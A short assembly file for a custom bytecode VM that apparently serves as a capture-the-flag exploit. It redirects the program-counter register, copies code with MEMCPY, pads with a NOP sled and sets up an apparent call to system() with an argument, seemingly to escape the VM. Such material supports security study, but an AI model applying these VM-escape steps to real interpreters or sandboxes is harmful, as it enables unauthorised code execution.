%include "vm.inc"

; change r7 - pc address
; need to sub 0x6c8


PUSH_IMM 0x6
POP_REG 0

PUSH_IMM 8
POP_REG 1

SHL 0, 1


PUSH_IMM 0xc8
POP_REG 1
ADD 0, 1

SUB 7,0


; reg7 has the address of new code


PUSH_REG 6
PUSH_REG 6
PUSH_REG 7
PUSH_IMM 0x61
PUSH_IMM 0
PUSH_IMM 0x13

PUSH_IMM 255
POP_REG 1

PUSH_IMM 0xd2
POP_REG 2

MEMCPY 1, 2, 0x41


; jump here after memcpy
times (0x60 - ($ - $$)) db 0x90



PUSH_REG 4 ; arg
PUSH_REG 5 ; system



EXPAND
